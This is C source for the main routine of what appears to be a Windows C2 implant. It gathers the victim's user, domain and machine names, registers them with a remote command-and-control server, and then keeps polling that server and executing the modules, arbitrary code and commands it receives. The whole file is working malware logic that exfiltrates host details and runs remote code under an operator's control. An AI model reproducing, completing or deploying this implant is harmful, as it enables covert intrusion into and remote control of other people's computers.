#define WIN32_LEAN_AND_MEAN

// headers needed so we can function

#include <windows.h>
#include <stdio.h>

// main header file

#include "core.h"
#include "beacon.h"

// dynamic header file, contains all info for callback

#include "settings.h"

// dllmain, fist code to run
// BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )

void main()
{

    // jus sum variables lol
    BOOL     Success;
    DWORD    OpCode;
    char*    Buffer;
    DWORD    dwSize   = 63;
    BOOL     retValue = TRUE;
    LPCWSTR  UriBuffer[MAX_PATH * 3];
    struct   BasicUserInfo UserInfo;

    // collect basic info

    if (!GetBasicUserInfo(&UserInfo))
    {
        // thats kind of a tuff one, we need this info to function and if we can't get this basic info straight up we cant follow the protocol properly.
        // let still callback to the C2 but lets just inform them of the error, via NULLs. therefore we still get to keep the session cause other stuff might work.

        strcpy( UserInfo.UserName, "NULL" );
        strcpy( UserInfo.DomainName, "NULL" );
        strcpy( UserInfo.ComputerName, "NULL" );
    }

    // format the data correctly so it can be used when we call back to the c2
    sprintf(UriBuffer, "username=%s&domain=%s&machine=%s", UserInfo.UserName, UserInfo.DomainName, UserInfo.ComputerName);

    // try register back with the C2

    printf("%s, %d\n", UriBuffer, dwSize);

    while (!BeaconRegisterC2(_C2_CALLBACK_ADDRESS, _C2_CALLBACK_PORT, _CALLBACK_USER_AGENT, (LPCWSTR)UriBuffer, dwSize))
    {
        // not much we can do really if we cant hit the c2, guess we just wait an retry.
        printf("Failed to connect\n");
        Sleep(_CALLBACK_JITTER);
    }

    // callback to the c2 and check if theres a commands to run, if so check what it is and run it. If the command then fails to run, report this back to the c2.

    while (TRUE)
    {   

        Buffer = BeaconCallbackC2(_C2_CALLBACK_ADDRESS, _C2_CALLBACK_PORT, _CALLBACK_USER_AGENT, &OpCode, NULL, NULL, NULL);

        switch (OpCode)
        {
        case 0x1000:
            // no task, just sleep an check in later
            Success = TRUE;
            break;
        
        case 0x2000:
            // execute module, this is much stealthier
            Success = ExecuteCode(Buffer, TRUE);
            break;

        case 0x3000:
            // execute code provided from the user, execution method is diffrent
            // because the users will want output from there code. Also the module
            // code execution technique wont work so well will variable code 
            // provided by a user.
            Success = ExecuteCode(Buffer, FALSE);
            break;
        
        case 0x4000:
            // stdlib command so lets run it
            Success = Stdlib(Buffer);
            break;
        }

        if (!Success)
        {
            ReportExecutionFail();
        }

        Sleep(_CALLBACK_JITTER);
    }
    
    // really should not hit this, so if it does lets just die
    DieCleanly();
}